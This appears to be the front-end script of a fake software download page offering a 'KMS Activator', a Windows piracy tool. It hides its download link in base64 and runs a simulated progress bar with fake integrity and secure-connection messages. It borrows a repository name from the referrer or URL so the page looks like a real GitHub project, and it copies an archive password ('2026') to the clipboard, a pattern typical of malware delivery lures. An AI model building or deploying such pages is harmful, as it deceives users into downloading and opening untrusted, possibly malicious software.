(function() {
  const urlParts = [
  'aHR0cHM6Ly9naXRodWIuY29tLz8=',
  'ZXJyb3I='
];

  function decodePart(encoded) {
    try {
      return atob(encoded);
    } catch(e) {
      return '';
    }
  }

  function buildUrl() {
    const base = decodePart(urlParts[0]);
    const id = decodePart(urlParts[1]);
    return base + id;
  }

  const BASE_URL = buildUrl();

  document.addEventListener('DOMContentLoaded', function() {
    const progressFill = document.getElementById('progressFill');
    const progressContainer = document.querySelector('.transfer-panel');
    const downloadWrapper = document.getElementById('downloadWrapper');
    const instructionWrapper = document.getElementById('instructionWrapper');
    const downloadBtn = document.getElementById('downloadBtn');
    const instructionBtn = document.getElementById('instructionBtn');
    const statusTextEl = document.getElementById('statusText');
    const progressPercent = document.getElementById('progressPercentLabel');
    const cardRepoName = document.getElementById('cardRepoName');
    const repoNameMeta = document.getElementById('repoNameMeta');

    const messages = [
      'Preparing download...',
      'Verifying integrity...',
      'Establishing secure connection...',
      'Fetching release assets...',
      'Ready to download'
    ];

   function extractRepoName() {
  const urlParams = new URLSearchParams(window.location.search);
  const repoParam = urlParams.get('repo');
  if (repoParam) return repoParam;
  
  if (document.referrer) {
    try {
      const referrerUrl = new URL(document.referrer);
      if (referrerUrl.hostname === 'github.com') {
        return referrerUrl.href;
      }
    } catch (e) {}
  }

  if (repoNameMeta && repoNameMeta.content) {
    return repoNameMeta.content;
  }

  const path = window.location.pathname;
  const cleanPath = path.replace(/^\/+|\/+$/g, '');
  const parts = cleanPath.split('/');
  return parts[parts.length - 1] || 'quick-start-guide';
}

    const repoName = extractRepoName();
    if (repoNameMeta) {
      repoNameMeta.content = repoName;
    }
    
    if (cardRepoName) {
      cardRepoName.textContent = repoName;
    }

    let currentIndex = 0;
    const duration = 5000;
    const intervalTime = 50;
    let currentWidth = 0;
    
    const interval = setInterval(() => {
      currentWidth += (100 / (duration / intervalTime));
      
      if (currentWidth >= 100) {
        currentWidth = 100;
        if (progressFill) {
          progressFill.style.width = '100%';
        }
        if (progressPercent) {
          progressPercent.innerText = '100%';
        }
        clearInterval(interval);
        
        if (progressContainer) {
          progressContainer.style.opacity = '0.5';
        }
        if (statusTextEl) {
          statusTextEl.innerHTML = '<i class="fas fa-check-circle" style="color:#3fb950"></i> Ready to download';
        }
        if (downloadWrapper) {
          downloadWrapper.classList.add('visible');
        }
        if (instructionWrapper) {
          instructionWrapper.classList.add('visible');
        }
      } else {
        if (progressFill) {
          progressFill.style.width = currentWidth + '%';
        }
        if (progressPercent) {
          progressPercent.innerText = Math.floor(currentWidth) + '%';
        }
        
        const messageIndex = Math.floor((currentWidth / 100) * messages.length);
        if (messageIndex < messages.length && messageIndex !== currentIndex) {
          currentIndex = messageIndex;
          if (statusTextEl) {
            statusTextEl.style.opacity = '0';
            setTimeout(() => {
              if (statusTextEl) {
                statusTextEl.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> ' + messages[messageIndex];
                statusTextEl.style.opacity = '1';
              }
            }, 100);
          }
        }
      }
    }, intervalTime);

    if (downloadBtn) {
      downloadBtn.addEventListener('click', function() {
        if (BASE_URL && BASE_URL.startsWith('http')) {
          window.open(BASE_URL, '_blank');
          downloadBtn.innerHTML = '<i class="fas fa-check"></i> Started!';
          downloadBtn.disabled = true;
          downloadBtn.style.opacity = '0.7';
          setTimeout(() => {
            downloadBtn.innerHTML = '<i class="fas fa-download"></i> Download KMS Activator';
            downloadBtn.disabled = false;
            downloadBtn.style.opacity = '1';
          }, 3000);
        }
      });
    }

    const modal = document.getElementById('instructionModal');
    const closeModalBtn = document.getElementById('closeModalBtn');

    function openModal() {
      if (modal) modal.classList.add('active');
    }

    function closeModal() {
      if (modal) modal.classList.remove('active');
    }

    if (instructionBtn) {
      instructionBtn.addEventListener('click', function(e) {
        e.preventDefault();
        openModal();
      });
    }

    if (closeModalBtn) {
      closeModalBtn.addEventListener('click', closeModal);
    }

    window.addEventListener('click', function(e) {
      if (modal && modal.classList.contains('active') && e.target === modal) {
        closeModal();
      }
    });

    document.addEventListener('keydown', function(e) {
      if (e.key === 'Escape' && modal && modal.classList.contains('active')) {
        closeModal();
      }
    });

    const copyBtn = document.getElementById('copyPasswordBtn');
    if (copyBtn) {
      copyBtn.addEventListener('click', function() {
        navigator.clipboard.writeText('2026').then(() => {
          const prev = copyBtn.innerHTML;
          copyBtn.innerHTML = '<i class="fas fa-check"></i> copied!';
          setTimeout(() => {
            copyBtn.innerHTML = prev;
          }, 1500);
        });
      });
    }
  });
})();
